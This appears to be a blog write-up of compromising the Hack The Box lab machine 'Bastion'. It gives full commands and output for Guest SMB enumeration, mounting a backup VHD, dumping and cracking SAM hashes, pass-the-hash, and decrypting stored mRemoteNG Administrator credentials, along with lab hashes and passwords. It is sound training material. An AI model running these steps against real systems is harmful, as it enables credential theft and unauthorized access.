+++ 
draft = false 
date = 2019-08-05T17:31:48-04:00
title = "Hack The Box Write-up: Bastion"
description = "A write-up of the exploit process for the Bastion box on HTB."
slug = "" 
tags = ["Hack the Box", "pentesting"]
categories = []
externalLink = ""
series = []
+++

This is my first in a series of write-ups on systems I've successfully exploited on HackTheBox.
Bastion is a Windows host that at the time of writing has been rated fairly easy by other hackers,
which was my experience as well. However, this system was still a fun system to exploit with a novel
way of getting user access.

# Enumeration

First things first, let's nmap the box to see what services the box has running.
```
root@kali:bastion# nmap -p- -sV 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-05 20:49 EDT
Nmap scan report for 10.10.10.134
Host is up (0.060s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.64 seconds
```

One of the first things that stands out to me is that this host has OpenSSH listening on port 22.
[Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview) 
recently integrated OpenSSH into Windows, but this is the first time I've seen it running as a service
on a Windows host in the wild. We can't do anything with SSH right now, but this does indicate that this
host is a Windows 10 or Windows Server 2016 or 2019 box, since OpenSSH is only available on this flavor of
Windows. We will come back to this service later on in the write-up.

# SMB

Other than SSH and WinRM, the only other listening useful service is SMB. For SMB, I usually use a mix
of enum4linux and smbmap to try to enumerate information about listening shares and the level of access
provided by the server. First, I tried enumerating access using an anonymous logon, which would be rare
on such a modern version of Windows, but is still worth a shot.

```
root@kali:smb# enum4linux 10.10.10.134
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Aug  5 20:58:24 2019

--snip--
[E] Server doesn't allow session using username '', password ''. Aborting remainder of tests.
```

Unfortunately, anonymous access didn't get us anything. It has, thankfully, gotten progressively more 
difficult to set up anonymous SMB shares in Windows over the years, so this is pretty realistic.
One other thing I like to try to enumerate access is by using the built-in Guest account with no 
password. Let's give that a shot.

```
root@kali:smb# enum4linux -u Guest 10.10.10.134
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Aug  5 21:01:33 2019

--snip--
 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.134    |
 ==================================================== 
[E] Can't find workgroup/domain


 ===================================== 
|    Session Check on 10.10.10.134    |
 ===================================== 
Use of uninitialized value  in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.134 allows sessions using username 'Guest', password ''
Use of uninitialized value  in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.134    |
 =========================================== 
Use of uninitialized value  in concatenation (.) or string at ./enum4linux.pl line 359.
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
[+] Can't determine if host is part of domain or part of a workgroup
enum4linux complete on Mon Aug  5 21:01:44 2019
```

It looks like the server allows connections as Guest! Running enum4linux with the `-a` parameter
only listed what shares the Guest user is able to access, and nothing else helpful.

```
root@kali:smb# enum4linux -a -u Guest 10.10.10.134
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Aug  5 21:03:25 2019

--snip--

 ========================================= 
|    Share Enumeration on 10.10.10.134    |
 ========================================= 
Use of uninitialized value  in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Failed to connect with SMB1 -- no workgroup available

--snip--
```
I didn't expect to be able to access the default administrative shares (ADMIN$, C$, and IPC$), and
attempting to connect using smbclient confirmed that. However, the Backups share seems interesting
to us. Let's see what's inside that share.

```
root@kali:smb# smbclient -U Guest //10.10.10.134/Backups
Enter WORKGROUP\Guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug  5 21:09:35 2019
  ..                                  D        0  Mon Aug  5 21:09:35 2019
  ASwYWuILip                          D        0  Mon Aug  5 20:51:59 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  oTWBZwpEdv                          D        0  Mon Aug  5 20:51:50 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  tmp                                 A      116  Mon Aug  5 21:09:35 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2788438 blocks available
```

This confirms what the name of the share suggests: this share is used for backups by other systems
in this scenario. The other folders and files are artifacts of various SMB scanners verifying
read/write access on the share, which are left behind because the Guest user can only read and create
files on the share, not delete them. `note.txt` contains the following text: `Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.`
I believe this is a hint to help transfer files that we find later on. Looking further into the
WindowsImageBackup folder, there appears to be a single backup for the `L4mpje-PC` system performed
on February 22, 2019. L4mpje is the name of the creator of this box, so we're on the right track. 
Listing the contents of the directory for this backup reveals two large files, as well as some other metadata:

```
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  .                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                     A     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml      A     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml      A     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml      A     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml      A     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml      A     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml      A     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml      A     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml      A     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml      A     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml      A  2374620  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2788327 blocks available
```
The two vhd's at the top are very attractive targets, but the size of the download caused timeouts that
caused the download to fail at first. Using the `timeout` command and setting the value to a 
much bigger timeout allows these files to be downloaded. 

# Disk image forensics

I had trouble mounting the first disk image, 
but it turns out the second disk image was the more important one anyway, as it has the Windows 
filesystem on it.
```
root@kali:smb# guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/disk1
root@kali:smb# cd /mnt/disk1
root@kali:disk1# ls
$Recycle.Bin autoexec.bat config.sys Documents and Settings pagefile.sys PerfLogs ProgramData Program Files Recovery System Volume Information Users Windows
```
Looking around the filesystem, it appears to be a very basic install of Windows with no other programs
installed and the user L4mpje as a local administrator. We can extract the hashes for users from the 
registry using the pwdump tool. This tool uses the SECURITY and SAM hives of the registry and outputs
the user information and hashes in a format that looks like `/etc/shadow` on Linux systems, which
is what John The Ripper expects.
```
root@kali:disk1# cd Windows/System32/config
root@kali:config# pwdump SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
Using pth-smbclient, we verify that the hash extracted from the SAM database matches the hash on
Bastion.
```
root@kali:bastion# pth-smbclient -U L4mpje%aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 //10.10.10.134/Backups
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Mon Aug  5 21:09:35 2019
  ..                                  D        0  Mon Aug  5 21:09:35 2019
  ASwYWuILip                          D        0  Mon Aug  5 20:51:59 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  oTWBZwpEdv                          D        0  Mon Aug  5 20:51:50 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  tmp                                 A      116  Mon Aug  5 21:09:35 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2788438 blocks available
```
I exported the hash information to a file and passed that to John The Ripper using the rockyou.txt
wordlist, and was able to recover the password for the L4mpje user.
```
root@kali:bastion# john hashes --show --format=nt
Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

3 password hashes cracked, 0 left
```

# User own

We are able to SSH into the host using the recovered L4mpje password, getting us a nice cmd.exe shell
over SSH.

```
root@kali:bastion# ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:
[screen clear]
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>
```
Looking around the system, we see there's a couple more programs installed on this box than L4mpje-PC.
```
l4mpje@BASTION C:\Users\L4mpje>cd ..\..
l4mpje@BASTION C:\>cd "Program Files (x86)"
l4mpje@BASTION C:\Program Files (x86)>dir
 Volume in drive C has no label.                      
 Volume Serial Number is 0CB3-C487
 
 Directory of C:\Program Files (x86)

22-02-2019  15:01    <DIR>          .                       
22-02-2019  15:01    <DIR>          ..                       
16-07-2016  15:23    <DIR>          Common Files                       
23-02-2019  10:38    <DIR>          Internet Explorer                       
16-07-2016  15:23    <DIR>          Microsoft.NET                       
22-02-2019  15:01    <DIR>          mRemoteNG                       
23-02-2019  11:22    <DIR>          Windows Defender                       
23-02-2019  10:38    <DIR>          Windows Mail                       
23-02-2019  11:22    <DIR>          Windows Media Player                       
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                       
16-07-2016  15:23    <DIR>          Windows NT                       
23-02-2019  11:22    <DIR>          Windows Photo Viewer                       
16-07-2016  15:23    <DIR>          Windows Portable Devices                       
16-07-2016  15:23    <DIR>          WindowsPowerShell                       
               0 File(s)              0 bytes                       
              14 Dir(s)  11.418.263.552 bytes free
```

[mRemoteNG](https://github.com/mRemoteNG/mRemoteNG) is an open source remote connections manager,
similar to RoyalTS or RDCMan. You configure connections with credentials in mRemoteNG, and simplify
connections to remote hosts. We can find the configuration data for mRemoteNG under the AppData folder
in L4mpje's user directory.

```
l4mpje@BASTION C:\Program Files (x86)> cd ..\Users\L4mpje\AppData\Roaming\mRemoteNG
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG

22-02-2019  15:03    <DIR>          .
22-02-2019  15:03    <DIR>          ..
22-02-2019  15:03             6.316 confCons.xml
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup
22-02-2019  15:03                51 extApps.xml
22-02-2019  15:03             5.217 mRemoteNG.log
22-02-2019  15:03             2.245 pnlLayout.xml
22-02-2019  15:01    <DIR>          Themes
              14 File(s)         76.577 bytes
               3 Dir(s)  11.417.452.544 bytes free
```

# Administrator own
Because this is a functional openSSH server, we can exfiltrate files using SCP just like on a Linux host.
```
root@kali:bastion# scp L4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml ./
L4mpje@10.10.10.134's password: 
confCons.xml                               100% 6316   110.0KB/s   00:00
root@kali:bastion# cat confCons.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" 
EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" 
Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" 
ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" 
	Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" 
	Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
	Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" 
	ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" 
	RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" 
	--snip-- />
    --snip--
</mrng:Connections>
```
The config file contains information about an RDP connection locally as Administrator, including a
base64 encoded encrypted blob as the password. A quick Internet search reveals that there is
a simple [Python script](https://github.com/haseebT/mRemoteNG-Decrypt) available on GitHub to decrypt
the password.
```
root@kali:bastion# python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```
Now that we have the Administrator password, we can SSH into the host with Administrative privileges,
root owning this box.
```
root@kali:bastion# ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password
[screen clear]
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>
```
# Summary
This box was a pretty simple box overall but with some fun puzzles, like figuring out how to deal with 
exfiltrating large files over SMB, and decrypting the password used by mRemoteNG. SMB is usually
thought about from a pentesting perspective as a service that, if vulnerable, can be used to easily
own a box as SYSTEM. This box was a great exercise in using SMB the way it was intended to exfiltrate
information.
